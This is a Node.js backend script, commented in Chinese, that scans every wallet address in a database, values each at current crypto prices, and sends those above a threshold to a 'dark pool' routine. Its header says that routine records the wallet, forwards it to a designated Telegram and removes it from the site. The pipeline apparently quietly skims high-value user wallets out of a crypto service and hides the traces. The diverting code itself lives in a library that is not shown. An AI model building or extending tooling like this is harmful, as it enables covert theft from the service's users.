#!/usr/bin/env node
/**
 * vault_backfill.js —— 暗池全量回扫（部署时一次性 / 手动重跑）
 * 对 addresses 全部地址按"存储值 + 现价"估值，≥阈值即入池（含 docs 记录 + 指定 TG + 站内清理）。
 * 用法：node tools/vault_backfill.js [--dry]
 */
'use strict';
const path = require('path');
const BASE = '/www/wwwroot/i.131422.com';
const lib = require(path.join(BASE, 'tools', 'vault_lib.js'));
const { pool } = require(path.join(BASE, 'adm888app', 'pg', 'pgStore.js'));

const DRY = process.argv.includes('--dry');

(async () => {
  const cfg = lib.loadCfg();
  const prices = lib.loadPrices();
  if (!prices) { console.error('[vault_backfill] price_cache 不可用，终止'); process.exit(1); }
  const vs = await lib.vaultSets();
  console.log(`[vault_backfill] 阈值 $${cfg.threshold} | 已入池 ${vs.addrs.size} 个地址 | dry=${DRY}`);
  let total = 0, hits = 0, vaulted = 0;
  let offset = 0;
  while (true) {
    const r = await pool.query(
      `SELECT id, public_key, chain, bal, data FROM addresses ORDER BY id LIMIT 5000 OFFSET $1`, [offset]);
    if (!r.rows.length) break;
    for (const row of r.rows) {
      total++;
      if (!row.public_key) continue;
      const v = lib.valueOf(lib.fromRow(row), prices);
      if (!(v.value >= cfg.threshold)) continue;
      hits++;
      console.log(`  ⚠ 命中 ≈$${v.value.toFixed(2)} | ${row.public_key} | serial=? | ${v.parts.join(' · ') || '-'}`);
      if (DRY) continue;
      if (vs.addrs.has(row.public_key)) { console.log('    （已入池，跳过）'); continue; }
      const rs = await lib.checkAndVault({ addr: row.public_key, value: v.value, parts: v.parts, reason: 'backfill' });
      if (rs && rs.vaulted) vaulted++;
    }
    offset += r.rows.length;
  }
  console.log(`[vault_backfill] 完成：扫描 ${total}，命中 ${hits}，新入池 ${vaulted}${DRY ? '（dry 无写入）' : ''}`);
  process.exit(0);
})().catch(e => { console.error('[vault_backfill] fatal', e); process.exit(1); });
